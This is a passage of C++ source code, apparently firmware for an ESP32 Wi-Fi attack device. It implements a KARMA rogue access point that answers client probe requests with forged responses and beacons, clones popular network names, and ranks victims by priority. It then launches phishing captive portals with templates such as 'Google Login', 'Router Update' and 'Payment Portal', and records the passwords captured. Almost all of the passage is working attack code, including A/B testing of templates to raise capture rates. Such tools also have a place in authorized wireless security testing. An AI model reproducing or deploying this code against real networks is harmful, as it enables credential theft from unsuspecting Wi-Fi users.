        portal.templateFile = selectedTemplate.filename;
        portal.isDefaultTemplate = selectedTemplate.isDefault;
        portal.verifyPassword = selectedTemplate.verifyPassword;
        portal.priority = 255;
        portal.tier = TIER_HIGH;
        portal.duration = attackConfig.highTierDuration * 2;
        portal.isCloneAttack = false;
        portal.probeCount = client.probeCount;
        portal.clientFingerprint = client.fingerprint;
        portal.isHighValueTarget = true;
        portal.failureCount = 0;
        portal.lastAttempt = 0;
        
        enqueuePendingPortal(portal, true);
        
        Serial.printf("[KARMA] High-value permanent target: %s (FP: %lu, Rate: %.1f%%)\n",
                     portal.ssid.c_str(), (unsigned long)client.fingerprint, client.successRate);
    }
}

// ============================================================
// Channel Management
// ============================================================

void updateChannelActivity(uint8_t channel) {
    if (channel >= 1 && channel <= 14) {
        channelActivity[channel - 1]++;
        // Decay old activity
        if (channelActivity[channel - 1] > 100) {
            for (int i = 0; i < 14; i++) {
                if (i != channel - 1) channelActivity[i] *= 0.9;
            }
        }
    }
}

uint8_t getBestChannel() {
    uint8_t best = 1;
    uint16_t maxActivity = 0;
    for (int i = 0; i < 14; i++) {
        if (channelActivity[i] > maxActivity) {
            maxActivity = channelActivity[i];
            best = i + 1;
        }
    }
    return best;
}

void setChannelWithSecond(uint8_t channel) {
    wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
    esp_wifi_set_channel(channel, secondCh);
}

void smartChannelHop() {
    if (!auto_hopping) return;

    if (activePortalChannel > 0) {
        if (channl != activePortalChannel - 1) {
            channl = activePortalChannel - 1;
            esp_wifi_set_channel(activePortalChannel, WIFI_SECOND_CHAN_NONE);
        }
        return;
    }

    unsigned long now = millis();
    if (now - last_ChannelChange < hop_interval) return;
    
    // Use adaptive hopping instead of fixed channel list
    // This will automatically use 2.4GHz, 5GHz, or 6GHz channels based on hardware support
    karmaAdaptiveHop();
    last_ChannelChange = now;
}

// ============================================================
// SSID Frequency Tracking
// ============================================================

void updateSSIDFrequency(const String &ssid) {
    if (ssid.isEmpty() || ssid == "*WILDCARD*") return;
    auto it = ssidFrequency.find(ssid);
    if (it != ssidFrequency.end()) {
        it->second++;
    } else {
        if (ssidFrequency.size() >= MAX_POPULAR_SSIDS) {
            auto minIt = std::min_element(ssidFrequency.begin(), ssidFrequency.end(),
                [](const auto& a, const auto& b) { return a.second < b.second; });
            if (minIt != ssidFrequency.end()) {
                ssidFrequency.erase(minIt);
            }
        }
        ssidFrequency[ssid] = 1;
    }
    static unsigned long lastSort = 0;
    if (millis() - lastSort > 5000) {
        lastSort = millis();
        popularSSIDs.clear();
        for (const auto &pair : ssidFrequency) {
            popularSSIDs.push_back(std::make_pair(pair.first, pair.second));
            if (popularSSIDs.size() >= MAX_POPULAR_SSIDS) break;
        }
        std::sort(popularSSIDs.begin(), popularSSIDs.end(), [](const auto &a, const auto &b) {
            return a.second > b.second;
        });
    }
}

// ============================================================
// Clone Attack Detection
// ============================================================

void checkCloneAttackOpportunities() {
    if (!attackConfig.enableCloneMode || popularSSIDs.empty()) return;
    if (millis() - lastFrequencyReset > SSID_FREQUENCY_RESET) {
        ssidFrequency.clear();
        popularSSIDs.clear();
        lastFrequencyReset = millis();
        return;
    }
    size_t maxNetworks = std::min((size_t)attackConfig.maxCloneNetworks, popularSSIDs.size());
    for (size_t i = 0; i < maxNetworks; i++) {
        const auto &ssidPair = popularSSIDs[i];
        if (ssidPair.second >= attackConfig.cloneThreshold) {
            bool alreadyAttacking = false;
            for (const auto &portal : pendingPortals) {
                if (portal.ssid == ssidPair.first && portal.isCloneAttack) {
                    alreadyAttacking = true;
                    break;
                }
            }
            if (!alreadyAttacking && pendingPortals.size() < MAX_PENDING_PORTALS) {
                PendingPortal portal;
                portal.ssid = ssidPair.first;
                portal.channel = getBestChannel();
                portal.timestamp = millis();
                portal.launched = false;
                
                String contextTemplate = getContextualTemplate(ssidPair.first);
                if (!contextTemplate.isEmpty() && attackConfig.enableContextualTemplate) {
                    portal.templateName = contextTemplate;
                    portal.templateFile = "/PortalTemplates/" + contextTemplate + ".html";
                    portal.isDefaultTemplate = false;
                } else {
                    portal.templateName = selectedTemplate.name;
                    portal.templateFile = selectedTemplate.filename;
                    portal.isDefaultTemplate = selectedTemplate.isDefault;
                }
                
                portal.verifyPassword = selectedTemplate.verifyPassword;
                portal.priority = 100;
                portal.tier = TIER_CLONE;
                portal.duration = attackConfig.cloneDuration;
                portal.isCloneAttack = true;
                portal.probeCount = ssidPair.second;
                portal.clientFingerprint = 0;
                portal.isHighValueTarget = false;
                portal.failureCount = 0;
                portal.lastAttempt = 0;
                enqueuePendingPortal(portal);
                cloneAttacksLaunched++;
            }
        }
    }
}

// ============================================================
// Response Queue Processing
// ============================================================

void queueProbeResponse(const ProbeRequest &probe, const RSNInfo &rsn) {
    String probeMac = probe.mac;
    if (macBlacklist.find(probeMac) != macBlacklist.end()) {
        if (millis() - macBlacklist[probeMac] < 60000) return;
        else macBlacklist.erase(probeMac);
    }
    if (responseQueue.size() >= 20) {
        while (responseQueue.size() > 15) responseQueue.pop();
    }
    if (probeSSIDEquals(probe, "*WILDCARD*")) return;
    
    ProbeResponseTask task;
    task.ssid = probe.ssid;
    task.targetMAC = probe.mac;
    task.channel = probe.channel;
    task.rsn = rsn;
    task.timestamp = millis();
    task.retryCount = 0;
    task.isRetry = false;
    responseQueue.push(task);
    if (responseQueue.size() <= 3) processResponseQueue();
}

void processResponseQueue() {
    unsigned long now = millis();
    while (!responseQueue.empty()) {
        ProbeResponseTask &task = responseQueue.front();
        if (now - task.timestamp > RESPONSE_TIMEOUT_MS) {
            if (task.retryCount < MAX_RETRIES_PER_SSID) {
                task.retryCount++;
                task.isRetry = true;
                task.timestamp = now + (task.retryCount * 100);
                responseQueue.push(task);
                broadcastAttack.recordFailedResponse(task.ssid);
            }
            responseQueue.pop();
            continue;
        }
        uint8_t responseFrame[256];
        size_t frameLen = buildEnhancedProbeResponse(
            responseFrame, task.ssid, task.targetMAC, task.channel, task.rsn, false
        );
        if (sendRawFrameOnAp(responseFrame, frameLen, task.channel)) {
            karmaResponsesSent++;
            if (networkHistory.size() < MAX_NETWORK_HISTORY) {
                auto it = networkHistory.find(task.ssid);
                if (it == networkHistory.end()) {
                    NetworkHistory history;
                    history.ssid = task.ssid;
                    history.responsesSent = 1;
                    history.lastResponse = now;
                    history.successfulConnections = 0;
                    history.failureCount = 0;
                    history.successRate = 100;
                    history.lastAttempt = now;
                    networkHistory[task.ssid] = history;
                } else {
                    it->second.responsesSent++;
                    it->second.lastResponse = now;
                    it->second.failureCount = 0;
                    it->second.successRate = 100;
                }
            }
            bool found = false;
            for (auto &net : activeNetworks) {
                if (net.ssid == task.ssid) {
                    found = true;
                    net.lastActivity = now;
                    net.responseCount++;
                    net.isActive = true;
                    break;
                }
            }
            if (!found && activeNetworks.size() < MAX_CONCURRENT_SSIDS) {
                ActiveNetwork net;
                net.ssid = task.ssid;
                net.channel = task.channel;
                net.rsn = task.rsn;
                net.lastActivity = now;
                net.lastBeacon = 0;
                net.beaconCount = 0;
                net.isActive = true;
                net.responseCount = 1;
                activeNetworks.push_back(net);
            }
        } else {
            auto it = networkHistory.find(task.ssid);
            if (it != networkHistory.end()) {
                it->second.failureCount++;
                uint32_t total = it->second.responsesSent + it->second.failureCount;
                if (total > 0) {
                    it->second.successRate = (it->second.responsesSent * 100) / total;
                }
            }
            broadcastAttack.recordFailedResponse(task.ssid);
            uint32_t fingerprint = 0;
            for (char c : task.targetMAC) fingerprint = ((fingerprint << 5) + fingerprint) + c;
            updateClientSuccessRate(fingerprint, false);
        }
        responseQueue.pop();
    }
}

// ============================================================
// Probe Event Processing
// ============================================================

void processQueuedProbeEvents() {
    if (!karmaQueue) return;

    QueuedProbeEvent event = {};
    while (xQueueReceive(karmaQueue, &event, 0) == pdTRUE) {
        ProbeRequest probe = {};
        strncpy(probe.mac, event.mac, sizeof(probe.mac) - 1);
        probe.mac[sizeof(probe.mac) - 1] = '\0';
        strncpy(probe.ssid, event.ssid, sizeof(probe.ssid) - 1);
        probe.ssid[sizeof(probe.ssid) - 1] = '\0';
        probe.rssi = event.rssi;
        probe.timestamp = event.timestamp;
        probe.channel = event.channel;
        probe.fingerprint = event.fingerprint;
        probe.isPMKID = event.isPMKID;

        analyzeClientBehavior(probe);
        updateChannelActivity(probe.channel);
        updateSSIDFrequency(probe.ssid);

        String ssid = probe.ssid;
        String mac = probe.mac;

        if ((karmaMode == MODE_PASSIVE || karmaMode == MODE_FULL) && broadcastAttack.isActive() &&
            ssid != "*WILDCARD*" && SSIDDatabase::contains(ssid)) {
            handleBroadcastResponse(ssid, mac);
        }

        bool isRandomizedMAC = false;
        if (mac.startsWith("12:") || mac.startsWith("22:") || mac.startsWith("32:") ||
            mac.startsWith("42:")) {
            isRandomizedMAC = true;
        }

        static uint32_t fakeMACCounter = 0;
        if (isRandomizedMAC) {
            fakeMACCounter++;
            if (fakeMACCounter % 50 == 0) {
                if (macBlacklist.find(mac) == macBlacklist.end() && macBlacklist.size() >= MAC_CACHE_SIZE) {
                    macBlacklist.erase(macBlacklist.begin());
                }
                macBlacklist[mac] = millis();
                continue;
            }
        }

        if (broadcastAttack.isActive()) broadcastAttack.processProbeResponse(ssid, mac);

        if (!karmaConfig.enableAutoKarma) continue;

        auto it = clientBehaviors.find(probe.fingerprint);
        if (it == clientBehaviors.end()) continue;

        ClientBehavior &client = it->second;
        uint8_t priority = calculateAttackPriority(client, probe);
        if (priority < attackConfig.priorityThreshold) continue;
        if (millis() - client.lastKarmaAttempt <= 10000) continue;

        queueProbeResponse(probe, event.rsn);
        client.lastKarmaAttempt = millis();

        AttackTier tier = determineAttackTier(priority);
        if (tier == TIER_NONE || pendingPortals.size() >= MAX_PENDING_PORTALS) continue;
        if (probeSSIDEquals(probe, "*WILDCARD*")) continue;

        PendingPortal portal;
        portal.ssid = probe.ssid;
        portal.channel = probe.channel;
        portal.targetMAC = probe.mac;
        portal.timestamp = millis();
        portal.launched = false;
        
        String contextTemplate = getContextualTemplate(probe.ssid);
        if (!contextTemplate.isEmpty() && attackConfig.enableContextualTemplate) {
            portal.templateName = contextTemplate;
            portal.templateFile = "/PortalTemplates/" + contextTemplate + ".html";
            portal.isDefaultTemplate = false;
        } else {
            portal.templateName = selectedTemplate.name;
            portal.templateFile = selectedTemplate.filename;
            portal.isDefaultTemplate = selectedTemplate.isDefault;
        }
        
        portal.verifyPassword = selectedTemplate.verifyPassword;
        portal.priority = priority;
        portal.tier = tier;
        portal.duration = getPortalDuration(tier);
        portal.isCloneAttack = false;
        portal.probeCount = 1;
        portal.clientFingerprint = probe.fingerprint;
        portal.isHighValueTarget = client.isPermanentTarget;
        portal.failureCount = 0;
        portal.lastAttempt = 0;
        enqueuePendingPortal(portal);
    }
}

// ============================================================
// Beacon Management
// ============================================================

void sendBeaconFrames() {
    if (activePortalChannel > 0) return;

    unsigned long now = millis();

    if (beaconsInBurst < BEACON_BURST_SIZE) {
        if (now - lastBeaconBurst > BEACON_BURST_INTERVAL) {
            if (!activeNetworks.empty()) {
                uint8_t netIndex = beaconsInBurst % activeNetworks.size();
                uint8_t beaconFrame[256];
                size_t frameLen = buildBeaconFrame(
                    beaconFrame,
                    activeNetworks[netIndex].ssid,
                    activeNetworks[netIndex].channel,
                    activeNetworks[netIndex].rsn
                );
                if (sendRawFrameOnAp(beaconFrame, frameLen, activeNetworks[netIndex].channel)) {
                    beaconsSent++;
                    activeNetworks[netIndex].beaconCount++;
                    activeNetworks[netIndex].lastBeacon = now;
                }
            }
            beaconsInBurst++;
            lastBeaconBurst = now;
        }
    } else {
        if (now - lastBeaconBurst > LISTEN_WINDOW) { beaconsInBurst = 0; }
    }
}

// ============================================================
// Association Checking
// ============================================================

void checkForAssociations() {
    unsigned long now = millis();
    for (auto &client : clientBehaviors) {
        if (client.second.probeCount > 5 && now - client.second.lastSeen < 5000) {
            for (const auto &ssid : client.second.probedSSIDs) {
                auto it = networkHistory.find(ssid);
                if (it != networkHistory.end()) {
                    if (now - it->second.lastResponse < 10000) {
                        it->second.successfulConnections++;
                        updateClientSuccessRate(client.first, true);
                    }
                }
            }
        }
    }
}

// ============================================================
// Portal Management
// ============================================================

void checkPortals() {
    if (karmaPaused) return;
    unsigned long now = millis();

    if (now - lastPortalHeartbeat < PORTAL_HEARTBEAT_INTERVAL) return;

    if (activePortal == nullptr) {
        lastPortalHeartbeat = now;
        return;
    }
    if (activePortal->instance == nullptr) {
        destroyActivePortal();
        lastPortalHeartbeat = now;
        return;
    }

    if (activePortal->instance != nullptr) {
        activePortal->instance->checkAndExtendDuration();
        activePortal->targetEngaged = activePortal->instance->hasRecentPageView();
        
        if (activePortal->targetEngaged) {
            if (activePortal->engagementTime == 0) {
                activePortal->engagementTime = now;
            }
            activePortal->pageViewCount++;
        }

        unsigned long portalAge = now - activePortal->launchTime;

        if (activePortal->instance->hasCredentials()) {
            String password = activePortal->instance->getCapturedPassword();
            String identifier = ""; // EvilPortal doesn't have getCapturedIdentifier
            activePortal->hasCreds = true;
            activePortal->capturedPassword = password;
            activePortal->capturedIdentifier = identifier;
            
            if (activePortal->clientFingerprint != 0) {
                updateClientSuccessRate(activePortal->clientFingerprint, true);
            }
            
            savePortalCredentials(
                activePortal->ssid,
                identifier.isEmpty() ? "user" : identifier,
                password,
                "unknown",
                activePortal->channel,
                activePortal->instance->getApName(),
                activePortal->portalId
            );
            destroyActivePortal();
            lastPortalHeartbeat = now;
            return;
        }

        if (activePortal->targetEngaged) {
            uint32_t maxDuration = attackConfig.extendedDuration;
            if (activePortal->pageViewCount > 10) {
                maxDuration = attackConfig.extendedDuration * 2;
            }
            if (portalAge > maxDuration) {
                destroyActivePortal();
                lastPortalHeartbeat = now;
                return;
            }
        } else {
            if (portalAge > attackConfig.baseDuration) {
                destroyActivePortal();
                lastPortalHeartbeat = now;
                return;
            }
        }
    }

    if (channl != activePortal->channel - 1) {
        channl = activePortal->channel - 1;
        setChannelWithSecond(activePortal->channel);
    }

    activePortal->instance->processRequests();
    activePortal->lastHeartbeat = now;
    lastPortalHeartbeat = now;
}

void launchBackgroundPortal(const String &ssid, uint8_t channel, const String &templateName, 
                           const String &templateFile) {
    if (activePortal != nullptr) {
        if (pendingPortals.size() < MAX_PENDING_PORTALS) {
            PendingPortal portal;
            portal.ssid = ssid;
            portal.channel = channel;
            portal.timestamp = millis();
            portal.launched = false;
            portal.templateName = templateName;
            portal.templateFile = templateFile;
            portal.isDefaultTemplate = true;
            portal.verifyPassword = selectedTemplate.verifyPassword;
            portal.priority = 100;
            portal.tier = TIER_HIGH;
            portal.duration = attackConfig.highTierDuration;
            portal.isCloneAttack = false;
            portal.probeCount = 1;
            portal.clientFingerprint = 0;
            portal.isHighValueTarget = false;
            portal.failureCount = 0;
            portal.lastAttempt = 0;
            enqueuePendingPortal(portal);
        }
        return;
    }
    
    if (ssid.isEmpty() || ssid == "*WILDCARD*") return;

    BackgroundPortal *portal = new (std::nothrow) BackgroundPortal();
    if (portal == nullptr) { return; }
    portal->ssid = ssid;
    portal->channel = channel;
    portal->launchTime = millis();
    portal->lastHeartbeat = millis();
    portal->hasCreds = false;
    portal->clientFingerprint = 0;
    portal->portalId = generatePortalId(templateName);
    portal->targetEngaged = false;
    portal->engagementTime = 0;
    portal->pageViewCount = 0;

    String actualTemplateFile = templateFile;
    if (actualTemplateFile.isEmpty()) {
        actualTemplateFile = "/PortalTemplates/" + templateName + ".html";
    }
    
    portal->instance = new (std::nothrow) EvilPortal(ssid, channel, false, false, true, true, actualTemplateFile);
    if (portal->instance == nullptr) {
        delete portal;
        return;
    }

    portal->instance->setBaseDuration(attackConfig.baseDuration / 1000);
    portal->instance->setExtendedDuration(attackConfig.extendedDuration / 1000);

    activePortal = portal;
    activePortalChannel = channel;
    isPortalActive = true;
    auto_hopping = false;
    channl = channel - 1;
    setChannelWithSecond(channel);
    Serial.printf("[PORTAL] Launched background portal %s on ch%d (ID: %s)\n",
                 ssid.c_str(), channel, portal->portalId.c_str());
}

void launchTieredEvilPortal(PendingPortal &portal) {
    Serial.printf("[TIER-%d] Launching background portal for %s\n", portal.tier, portal.ssid.c_str());
    
    if (attackConfig.enableTemplateABTesting) {
        unsigned long now = millis();
        if (now - lastTemplateRotation > TEMPLATE_ROTATION_INTERVAL) {
            templateRotationIndex = (templateRotationIndex + 1) % portalTemplates.size();
            lastTemplateRotation = now;
            
            if (templateRotationIndex < portalTemplates.size()) {
                PortalTemplate &tmpl = portalTemplates[templateRotationIndex];
                portal.templateName = tmpl.name;
                portal.templateFile = tmpl.filename;
                portal.isDefaultTemplate = tmpl.isDefault;
                portal.verifyPassword = tmpl.verifyPassword;
            }
        }
    }
    
    launchBackgroundPortal(portal.ssid, portal.channel, portal.templateName, portal.templateFile);

    if (portal.isCloneAttack) cloneAttacksLaunched++;
    else autoPortalsLaunched++;
    screenNeedsRedraw = true;
}

void executeTieredAttackStrategy() {
    if (pendingPortals.empty() || !templateSelected || isPortalActive || karmaPaused) return;
    
    std::sort(pendingPortals.begin(), pendingPortals.end(), [](const PendingPortal &a, const PendingPortal &b) {
        if (a.isHighValueTarget && !b.isHighValueTarget) return true;
        if (!a.isHighValueTarget && b.isHighValueTarget) return false;
        if (a.isCloneAttack && !b.isCloneAttack) return true;
        if (!a.isCloneAttack && b.isCloneAttack) return false;
        return a.priority > b.priority;
    });
    
    if (attackConfig.enableTieredAttack) {
        for (auto it = pendingPortals.begin(); it != pendingPortals.end();) {
            if (it->isHighValueTarget && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else ++it;
        }
        
        for (auto it = pendingPortals.begin(); it != pendingPortals.end();) {
            if (it->isCloneAttack && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else ++it;
        }
        
        for (auto it = pendingPortals.begin(); it != pendingPortals.end();) {
            if (it->tier == TIER_HIGH && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else ++it;
        }
        
        std::vector<PendingPortal> mediumTargets;
        for (const auto &portal : pendingPortals) {
            if (portal.tier == TIER_MEDIUM && !portal.launched) {
                mediumTargets.push_back(portal);
                if (mediumTargets.size() >= 2) break;
            }
        }
        if (!mediumTargets.empty()) {
            for (auto &target : mediumTargets) {
                for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ++it) {
                    if (it->ssid == target.ssid && it->targetMAC == target.targetMAC) {
                        launchTieredEvilPortal(*it);
                        it->launched = true;
                        pendingPortals.erase(it);
                        return;
                    }
                }
            }
        }
        
        for (auto it = pendingPortals.begin(); it != pendingPortals.end();) {
            if (it->tier == TIER_FAST && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else ++it;
        }
    } else {
        for (auto it = pendingPortals.begin(); it != pendingPortals.end();) {
            if (!it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else ++it;
        }
    }
}

void checkPendingPortals() {
    if (pendingPortals.empty() || !templateSelected || isPortalActive || karmaPaused) return;
    unsigned long now = millis();
    
    pendingPortals.erase(
        std::remove_if(pendingPortals.begin(), pendingPortals.end(),
            [now](const PendingPortal &p) { 
                if (now - p.timestamp > 300000) return true;
                if (p.failureCount >= 3) return true;
                return false;
            }),
        pendingPortals.end()
    );
    
    for (auto &portal : pendingPortals) {
        if (now - portal.lastAttempt > 60000 && portal.failureCount > 0) {
            portal.failureCount = 0;
        }
    }
    
    executeTieredAttackStrategy();
}

void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd) {
    (void)verifyPwd;
    if (activePortal != nullptr) {
        if (pendingPortals.size() >= MAX_PENDING_PORTALS) return;
        PendingPortal portal;
        portal.ssid = ssid;
        portal.channel = channel;
        portal.timestamp = millis();
        portal.launched = false;
        portal.templateName = selectedTemplate.name;
        portal.templateFile = selectedTemplate.filename;
        portal.isDefaultTemplate = selectedTemplate.isDefault;
        portal.verifyPassword = selectedTemplate.verifyPassword;
        portal.priority = 255;
        portal.tier = TIER_HIGH;
        portal.duration = attackConfig.highTierDuration;
        portal.isCloneAttack = false;
        portal.probeCount = 1;
        portal.clientFingerprint = 0;
        portal.isHighValueTarget = false;
        portal.failureCount = 0;
        portal.lastAttempt = 0;
        enqueuePendingPortal(portal, true);
        return;
    }
    Serial.printf("[MANUAL] Launching background portal for %s (ch%d)\n", ssid.c_str(), channel);
    launchBackgroundPortal(ssid, channel, selectedTemplate.name, selectedTemplate.filename);
}

void handleBroadcastResponse(const String &ssid, const String &mac) {
    if (broadcastAttack.isActive() && !karmaPaused) {
        broadcastAttack.processProbeResponse(ssid, mac);

        uint32_t fingerprint = 0;
        for (int i = 0; i < mac.length(); i++) {
            fingerprint = ((fingerprint << 5) + fingerprint) + mac.charAt(i);
        }

        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) return;

        auto it = clientBehaviors.find(fingerprint);
        if (it == clientBehaviors.end()) {
            ClientBehavior behavior;
            behavior.fingerprint = fingerprint;
            behavior.lastMAC = mac;
            behavior.firstSeen = millis();
            behavior.lastSeen = millis();
            behavior.probeCount = 1;
            behavior.avgRSSI = -50;
            behavior.probedSSIDs.push_back(ssid);
            behavior.favoriteChannel = pgm_read_byte(&karma_channels[channl % 14]);
            behavior.lastKarmaAttempt = 0;
            behavior.isVulnerable = true;
            behavior.successfulInteractions = 0;
            behavior.failedInteractions = 0;
            behavior.successRate = 0.0f;
            behavior.consecutiveFailures = 0;
            behavior.lastSuccessTime = 0;
            behavior.isPermanentTarget = false;
            behavior.priorityScore = 0;
            clientBehaviors[fingerprint] = behavior;
            uniqueClients++;

            if (karmaConfig.enableAutoKarma && pendingPortals.size() < MAX_PENDING_PORTALS) {
                PendingPortal portal;
                portal.ssid = ssid;
                portal.channel = pgm_read_byte(&karma_channels[channl % 14]);
                portal.targetMAC = mac;
                portal.timestamp = millis();
                portal.launched = false;
                portal.templateName = selectedTemplate.name;
                portal.templateFile = selectedTemplate.filename;
                portal.isDefaultTemplate = selectedTemplate.isDefault;
                portal.verifyPassword = selectedTemplate.verifyPassword;
                portal.priority = 70;
                portal.tier = TIER_HIGH;
                portal.duration = attackConfig.highTierDuration;
                portal.isCloneAttack = false;
                portal.probeCount = 1;
                portal.clientFingerprint = fingerprint;
                portal.isHighValueTarget = false;
                portal.failureCount = 0;
                portal.lastAttempt = 0;
                enqueuePendingPortal(portal);
            }
        }
    }
}

// ============================================================
// Template Loading
// ============================================================

void loadPortalTemplates() {
    portalTemplates.clear();
    portalTemplates.push_back({"Google Login", "", true, false, 5, "public"});
    portalTemplates.push_back({"Router Update", "", true, true, 4, "home"});
    portalTemplates.push_back({"Corporate Login", "", false, false, 3, "corporate"});
    portalTemplates.push_back({"Social Media", "", false, false, 2, "public"});
    portalTemplates.push_back({"Payment Portal", "", false, true, 1, "public"});
    
    if (setupLittleFS()) {
        if (!LittleFS.exists("/PortalTemplates")) LittleFS.mkdir("/PortalTemplates");
        if (LittleFS.exists("/PortalTemplates")) {
            File root = LittleFS.open("/PortalTemplates");
            File file = root.openNextFile();
            while (file && portalTemplates.size() < MAX_PORTAL_TEMPLATES) {
                if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
                    PortalTemplate tmpl;
                    String filename = String(file.name());
                    tmpl.name = getDisplayName("/" + filename, false);
                    tmpl.filename = "/PortalTemplates/" + filename;
                    tmpl.isDefault = false;
                    tmpl.verifyPassword = false;
                    tmpl.priority = 5;
                    tmpl.category = "custom";
                    String firstLine = file.readStringUntil('\n');
                    if (firstLine.indexOf("verify=\"true\"") != -1) tmpl.verifyPassword = true;
                    if (firstLine.indexOf("category=\"corporate\"") != -1) tmpl.category = "corporate";
                    if (firstLine.indexOf("category=\"home\"") != -1) tmpl.category = "home";
                    portalTemplates.push_back(tmpl);
                }
                file = root.openNextFile();
            }
        }
    }
    FS *fs = nullptr;
    if (getFsStorage(fs) && fs == &SD) {
        if (!SD.exists("/PortalTemplates")) SD.mkdir("/PortalTemplates");
        if (SD.exists("/PortalTemplates")) {
            File root = SD.open("/PortalTemplates");
            File file = root.openNextFile();
            while (file && portalTemplates.size() < MAX_PORTAL_TEMPLATES) {
                if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
                    PortalTemplate tmpl;
                    String filename = String(file.name());
                    tmpl.name = getDisplayName("/" + filename, true);
                    tmpl.filename = "/PortalTemplates/" + filename;
                    tmpl.isDefault = false;
                    tmpl.verifyPassword = false;
                    tmpl.priority = 5;
                    tmpl.category = "custom";
                    String firstLine = file.readStringUntil('\n');
                    if (firstLine.indexOf("verify=\"true\"") != -1) tmpl.verifyPassword = true;
                    if (firstLine.indexOf("category=\"corporate\"") != -1) tmpl.category = "corporate";
                    if (firstLine.indexOf("category=\"home\"") != -1) tmpl.category = "home";
                    portalTemplates.push_back(tmpl);
                }
                file = root.openNextFile();
            }
        }
    }
    
    std::sort(portalTemplates.begin(), portalTemplates.end(),
        [](const PortalTemplate& a, const PortalTemplate& b) {
            return a.priority > b.priority;
        });
}

bool selectPortalTemplate(bool isInitialSetup) {
    loadPortalTemplates();
    if (portalTemplates.empty()) {
        displayTextLine("No templates found!");
        delay(2000);
        return false;
    }
    drawMainBorderWithTitle("SELECT TEMPLATE");
    std::vector<Option> templateOptions;
    for (const auto &tmpl : portalTemplates) {
        String displayName = tmpl.name;
        if (tmpl.isDefault) displayName = "[D] " + displayName;
        if (tmpl.verifyPassword) displayName += " (verify)";
        if (!tmpl.category.isEmpty() && tmpl.category != "custom") {
            displayName += " [" + tmpl.category + "]";
        }
        templateOptions.push_back({displayName.c_str(), [=, &tmpl]() {
                                       selectedTemplate = tmpl;
                                       templateSelected = true;
                                       if (isInitialSetup) {
                                           drawMainBorderWithTitle("KARMA SETUP");
                                           displayTextLine("Selected: " + tmpl.name);
                                           delay(1000);
                                       }
                                   }});
    }
    templateOptions.push_back(
        {"Load Custom File", [=]() {
             drawMainBorderWithTitle("LOAD FROM");
             std::vector<Option> directOptions;

             FS *fs = nullptr;
             if (getFsStorage(fs) && fs == &SD) {
                 directOptions.push_back(
                     {"SD Card", [=]() {
                          drawMainBorderWithTitle("BROWSE SD");
                          String templateFile = loopSD(SD, true, "HTML", "/");
                          if (templateFile.length() > 0) {
                              PortalTemplate customTmpl;
                              String filename = templateFile.substring(templateFile.lastIndexOf('/') + 1);
                              customTmpl.name = getDisplayName("/" + filename, true);
                              customTmpl.filename = templateFile;
                              customTmpl.isDefault = false;
                              customTmpl.verifyPassword = false;
                              customTmpl.priority = 5;
                              customTmpl.category = "custom";
                              File file = SD.open(templateFile, FILE_READ);
                              if (file) {
                                  String firstLine = file.readStringUntil('\n');
                                  file.close();
                                  if (firstLine.indexOf("verify=\"true\"") != -1) {
                                      customTmpl.verifyPassword = true;
                                  }
                              }
                              selectedTemplate = customTmpl;
                              templateSelected = true;
                              if (portalTemplates.size() < MAX_PORTAL_TEMPLATES)
                                  portalTemplates.push_back(customTmpl);
                              drawMainBorderWithTitle("SELECTED");
                              displayTextLine(customTmpl.name);
                              delay(1500);
                              if (isInitialSetup) {
                                  drawMainBorderWithTitle("KARMA SETUP");
                                  displayTextLine("Selected: " + customTmpl.name);
                                  delay(1000);
                              }
                          }
                      }}
                 );
             }

             directOptions.push_back(
                 {"LittleFS", [=]() {
                      drawMainBorderWithTitle("BROWSE LITTLEFS");
                      if (setupLittleFS()) {
                          String templateFile = loopSD(LittleFS, true, "HTML", "/");
                          if (templateFile.length() > 0) {
                              PortalTemplate customTmpl;
                              String filename = templateFile.substring(templateFile.lastIndexOf('/') + 1);
                              customTmpl.name = getDisplayName("/" + filename, false);
                              customTmpl.filename = templateFile;
                              customTmpl.isDefault = false;
                              customTmpl.verifyPassword = false;
                              customTmpl.priority = 5;
                              customTmpl.category = "custom";
                              File file = LittleFS.open(templateFile, FILE_READ);
                              if (file) {
                                  String firstLine = file.readStringUntil('\n');
                                  file.close();
                                  if (firstLine.indexOf("verify=\"true\"") != -1) {
                                      customTmpl.verifyPassword = true;
                                  }
                              }
                              selectedTemplate = customTmpl;
                              templateSelected = true;
                              if (portalTemplates.size() < MAX_PORTAL_TEMPLATES)
                                  portalTemplates.push_back(customTmpl);
                              drawMainBorderWithTitle("SELECTED");
                              displayTextLine(customTmpl.name);
                              delay(1500);
                              if (isInitialSetup) {
                                  drawMainBorderWithTitle("KARMA SETUP");
                                  displayTextLine("Selected: " + customTmpl.name);
                                  delay(1000);
                              }
                          }
                      } else {
                          displayTextLine("LittleFS error!");
                          delay(1000);
                      }
                  }}
             );

             directOptions.push_back({"Back", [=]() {}});
             loopOptions(directOptions);
             drawMainBorderWithTitle("SELECT TEMPLATE");
         }}
    );
    templateOptions.push_back({"Disable Auto-Portal", [=]() {
                                   karmaConfig.enableAutoPortal = false;
                                   templateSelected = false;
                                   if (isInitialSetup) {
                                       drawMainBorderWithTitle("KARMA SETUP");
                                       displayTextLine("Auto-portal disabled");
                                       delay(1000);
                                   }
                               }});
    templateOptions.push_back({"Reload Templates", [=]() {
                                   loadPortalTemplates();
                                   displayTextLine("Templates reloaded");
                                   delay(1000);
                               }});
    loopOptions(templateOptions);
    return templateSelected;
}

// ============================================================
// Probe Sniffer
// ============================================================

void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    if (karmaPaused) return;
    if (!storageAvailable) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
